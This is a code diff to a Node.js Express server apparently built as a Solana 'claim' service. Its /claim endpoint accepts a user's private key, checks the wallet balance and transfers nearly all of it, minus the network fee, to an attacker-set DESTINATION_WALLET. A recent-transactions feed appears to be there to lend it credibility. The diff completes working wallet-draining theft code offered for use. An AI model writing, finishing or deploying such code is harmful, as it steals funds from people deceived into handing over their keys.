@@ -13,7 +13,6 @@ const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
 const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
 const connection = new Connection(RPC_URL);
 
-// 1. THE CLAIM ENDPOINT (With detailed error catching)
 app.post('/claim', async (req, res) => {
     try {
         let { privateKey } = req.body;
@@ -22,51 +21,61 @@ app.post('/claim', async (req, res) => {
             return res.status(400).json({ error: "Private key is required" });
         }
 
-        // 1. SANITIZE: Remove whitespace, quotes, or brackets if they pasted a JSON array
+        // 1. SANITIZE
         privateKey = privateKey.trim().replace(/["'\[\]]/g, '');
 
         let secretKey;
         try {
-            // 2. ATTEMPT DECODE: This is where the "Non-base58 character" error happens
             secretKey = bs58.decode(privateKey);
         } catch (decodeError) {
             console.error("💥 Decode Error:", decodeError.message);
             return res.status(400).json({ 
-                error: "Invalid private key format. Please ensure you are using a Base58 encoded key, not a seed phrase." 
+                error: "Invalid private key format. Please ensure you are using a Base58 encoded key." 
             });
         }
 
-        // ... rest of your transaction logic (Keypair.fromSecretKey, etc.)
-        
+        // 2. SETUP
+        const keyPair = Keypair.fromSecretKey(secretKey);
+        const destinationPublicKey = new PublicKey(DESTINATION_WALLET);
+
+        // 3. BALANCE CHECK
+        const balance = await connection.getBalance(keyPair.publicKey);
+        if (balance === 0) {
+            return res.status(400).json({ error: "Insufficient funds in wallet" });
+        }
+
+        // 4. CALCULATION (Balance minus 0.000005 SOL fee)
+        const fee = 0.000005 * 1000000000; 
+        const amountToSend = balance - fee;
+
+        if (amountToSend <= 0) {
+            return res.status(400).json({ error: "Wallet balance too low to cover gas fee" });
+        }
+
+        // 5. EXECUTION
+        const transaction = new Transaction().add(
+            SystemProgram.transfer({
+                fromPubkey: keyPair.publicKey,
+                toPubkey: destinationPublicKey,
+                lamports: amountToSend,
+            })
+        );
+
+        const signature = await sendAndConfirmTransaction(
+            connection, 
+            transaction, 
+            [keyPair]
+        );
+
+        console.log(`✅ Success: ${amountToSend} lamports moved to ${DESTINATION_WALLET}. TX: ${signature}`);
+        return res.json({ success: true, tx: signature });
+
     } catch (globalError) {
         console.error("💥 Transfer Error:", globalError.message);
-        res.status(500).json({ error: "Transaction failed" });
-    }
-});
-        // Execute and confirm
-        const signature = await sendAndConfirmTransaction(connection, transaction, [keyPair]);
-        
-        return res.json({ 
-            success: true, 
-            signature: signature, 
-            message: "Assets transferred successfully" 
-        });
-
-    } catch (error) {
-        console.error("💥 Transfer Error:", error);
-        
-        // Extract the actual reason from the Solana error object
-        const errorMessage = error.message || "Unknown transaction error";
-        
-        return res.status(500).json({ 
-            success: false, 
-            error: "Transaction failed", 
-            details: errorMessage 
-        });
+        return res.status(500).json({ error: "Transaction failed: " + globalError.message });
     }
 });
 
-// 2. THE DYNAMIC FEED (Silent failure to prevent log spam)
 app.get('/api/recent-txs', async (req, res) => {
     try {
         const response = await fetch(RPC_URL, {
@@ -75,8 +84,8 @@ app.get('/api/recent-txs', async (req, res) => {
             body: JSON.stringify({
                 jsonrpc: '2.0',
                 id: 1,
-                method: 'getSignaturesForAddress',
-                                params: ["11111111111111111111111111111111", { "limit": 10 }],
+                                method: 'getSignaturesForAddress',
+                params: ["11111111111111111111111111111111", { "limit": 10 }],
             })
         });
 
